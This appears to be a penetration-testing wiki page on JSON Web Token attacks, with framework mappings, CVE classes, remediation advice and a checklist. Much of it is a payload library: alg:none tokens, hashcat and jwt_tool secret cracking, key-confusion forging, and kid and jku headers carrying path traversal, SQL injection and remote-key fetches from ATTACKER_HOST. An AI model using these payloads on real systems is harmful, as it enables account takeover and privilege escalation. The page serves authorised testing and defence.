---
type: technique
title: JWT attacks
lang: en
status: active
wstg: ["WSTG-SESS-10"]
owasp_top10: ["A07:2021"]
owasp_api: ["API2:2023"]
asvs: ["V9.1.1", "V9.1.2", "V9.1.3", "V9.2.3"]
cwe: ["CWE-347"]
attack: ["T1550"]
cvss: ""
sources: [payloadsallthethings, hacktricks, colleague-web-wiki]
updated: 2026-09-17
---

# JWT attacks

**TL;DR** — A JSON Web Token is `base64url(header).base64url(payload).base64url(signature)`.
The signature is the **only** thing stopping an attacker rewriting claims like `"admin":true`.
Wherever the server verifies weakly — accepts `alg:none`, uses a crackable HMAC secret, confuses
HMAC with RSA, or trusts an attacker-supplied key via `kid`/`jku` — the token is forgeable and
that usually means full account takeover / privilege escalation.

> Framework: **A07:2021 – Identification & Authentication Failures**, `API2:2023`, `CWE-347`
> (improper verification of a cryptographic signature). WSTG `WSTG-SESS-10`.

## Where it applies

Anywhere a JWT carries identity/authorization: REST/SPA `Authorization: Bearer` headers,
session cookies, OAuth/OIDC access & ID tokens, password-reset and email-verification links,
and API keys shaped as JWTs. Spot them by the `eyJ…` prefix (base64url of `{"`).

## How it works

`header` names the algorithm (`alg`) and often a key hint (`kid`/`jku`/`x5u`/`jwk`); `payload`
holds the claims; `signature` is an HMAC (`HS256`) or a digital signature (`RS256`/`ES256`) over
the first two parts. The header and payload are **encoded, not encrypted** — anyone can read
them. Decode and tamper with [jwt.io], Burp's **JWT Editor**, or **jwt_tool**.

## Attacks (payload library)

All tokens/headers below are inert. Confirm a forge by presenting the crafted token and getting
an authenticated/elevated response.

### 1. Signature not verified (tamper-in-place)

Change a claim (`"user":"guest"` → `"user":"admin"`), keep the original header and signature. If
accepted, the app *decoded* instead of *verified*. Sanity check: flip a few signature bytes and
replay — still accepted ⇒ no verification.

### 2. `alg:none`

Set `alg` to `none` and **remove** the signature (keep the trailing dot). Naive filters that
only block lowercase are beaten by case variants:

```text
{"alg":"none"}      {"alg":"None"}      {"alg":"NONE"}      {"alg":"nOnE"}
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.        # header {"alg":"none"} . payload . (empty)
```
```bash
python3 jwt_tool.py <JWT> -X a          # jwt_tool: forge alg:none
```

### 3. Null / empty signature

Some libraries accept an `HS256` token whose signature segment is empty (nothing after the last
dot) — send the token ending in `.`. `jwt_tool <JWT> -X n`.

### 4. Weak HMAC secret — crack it offline

If `HS256` and the secret is a password/low-entropy string, crack it, then re-sign your tampered
payload with the recovered secret:

```bash
hashcat -a 0 -m 16500 jwt.txt wordlist.txt              # 16500 = JWT (HS*)
hashcat -a 0 -m 16500 jwt.txt rockyou.txt -r best64.rule
python3 jwt_tool.py <JWT> -C -d jwt.secrets.list        # jwt_tool dictionary crack
```
Wordlist of known/default JWT secrets: `wallarm/jwt-secrets`. After cracking, sign with the
secret (Burp JWT Editor symmetric key, or `jwt_tool -S hs256 -p '<secret>'`).

### 5. RS256 → HS256 key confusion

When the app expects `RS256` but doesn't pin the algorithm, it may verify an `HS256` token using
the **RSA public key** as the HMAC secret — and the public key is, by definition, public. Grab it
and forge:

```bash
# recover the server's public key
openssl s_client -connect target:443 2>/dev/null </dev/null | openssl x509 -pubkey -noout > pub.pem
# (or fetch /jwks.json, /.well-known/jwks.json)
python3 jwt_tool.py <JWT> -X k -pk pub.pem     # forge HS256 signed with the RSA public key
```
Burp JWT Editor: *Attack → HMAC Key Confusion*.

### 6. Key injection via embedded `jwk`

Embed your own public key in the header and sign with your matching private key; vulnerable
libraries trust the self-provided key:

```json
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","kid":"pwn","e":"AQAB","n":"<your-modulus>"}}
```
`jwt_tool <JWT> -X i` / Burp JWT Editor *→ Embedded JWK*.

### 7. `kid` header abuse

`kid` names which key to load; unsafe handling turns it into path traversal, SSRF, or injection:

```json
{"alg":"HS256","kid":"../../../../dev/null"}          // empty file → sign HMAC with key ""
{"alg":"HS256","kid":"/proc/sys/kernel/randomize_va_space"}  // predictable content "2" → sign with "2"
{"alg":"RS256","kid":"http://ATTACKER_HOST/key.pem"}  // remote key fetch = SSRF + forgeable
{"alg":"HS256","kid":"x' UNION SELECT 'known-secret'-- -"}   // SQLi in the key lookup
```
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

### 8. `jku` / `x5u` — JWKS/cert spoofing (+ SSRF)

Point `jku` (JWK-Set URL) or `x5u` (X.509 URL) at a JWKS/cert **you** host, sign with your private
key; if the verifier fetches and trusts it, the token is forged — and the fetch itself is SSRF
([[ssrf]]).

```json
{"alg":"RS256","jku":"https://ATTACKER_HOST/jwks.json"}
```
```bash
openssl genrsa -out keypair.pem 2048 && openssl rsa -in keypair.pem -pubout -out pub.crt
python3 jwt_tool.py <JWT> -X s -ju http://ATTACKER_HOST/jwks.json
```

### 9. Cross-JWT substitution

Replay a token minted for one purpose where a different one is expected — an OIDC **ID token** as
an **access token**, a reset token as a session — when the app verifies the signature but not
`typ` and `aud` (RFC 8725 §2.7–2.8). Common when tokens share an issuer/key.

## Established CVE classes (name-drop for reports)

`alg:none` (CVE-2015-9235), HMAC/RSA confusion (CVE-2016-5431 / CVE-2016-10555), embedded-`jwk`
trust (CVE-2018-0114), ECDSA "psychic signature" — `ES256` accepts a zeroed signature on Java
15–18 (CVE-2022-21449), and null-signature acceptance (CVE-2020-28042). *(Verify any CVE against
its advisory before citing in a report — never invent one.)*

## Tooling

**jwt_tool** (decode/tamper/crack/forge — `-M at` runs all checks against a request template),
**hashcat** `-m 16500`, **Burp JWT Editor** / **JOSEPH**, **jwt.io**. Hunt tokens in Burp with a
regex like `eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*`.

## Confirming impact

Present a forged token that elevates you (another user's `sub`, `role:admin`) and show the
authenticated action it unlocks — account takeover, admin access. Severity **High–Critical**.

## Remediation

- **Verify the signature** and **pin the algorithm to a server-side allow-list** — never trust the
  token's own `alg` (kills `alg:none` and HMAC/RSA confusion).
- Validate `exp`/`nbf`, `iss`, and **`aud`**; give each token kind an explicit `typ` with mutually
  exclusive validation rules (blocks cross-JWT substitution — RFC 8725).
- Treat `kid`/`jku`/`x5u`/`jwk` as **untrusted** — sanitise `kid`, allow-list key URLs (also stops
  the SSRF), never trust a self-embedded key.
- Strong, rotated keys from a secrets store; **never a password as an HMAC key**; short lifetimes
  with a revocation path; no secrets/PII in claims. (Full control set: [[colleague-web-wiki|jwt-security]],
  RFC 8725/9068.)

## Quick checklist

- [ ] Decode the token — sensitive claims? expired tokens rejected? `exp` enforced?
- [ ] Tamper a claim, keep the signature → accepted? (decode-not-verify).
- [ ] Try `alg:none` (+ case) and an empty signature.
- [ ] `HS256`? crack the secret (`hashcat -m 16500`). `RS256`? try HMAC/RSA confusion with the public key.
- [ ] Header lookups: `kid` traversal/SQLi/SSRF, `jku`/`x5u`/`jwk` pointing at your key. Confirm elevation.

## See also

[[authentication-attacks]] · [[idor]] · [[ssrf]] · [[rest-api]] · [[oswa-exam]]

*Sources: [[payloadsallthethings]] + [[hacktricks]] (attack library, jwt_tool/hashcat flows); [[colleague-web-wiki]] (WSTG-SESS-10 framing, RFC 8725/9068 remediation).*

[jwt.io]: https://jwt.io
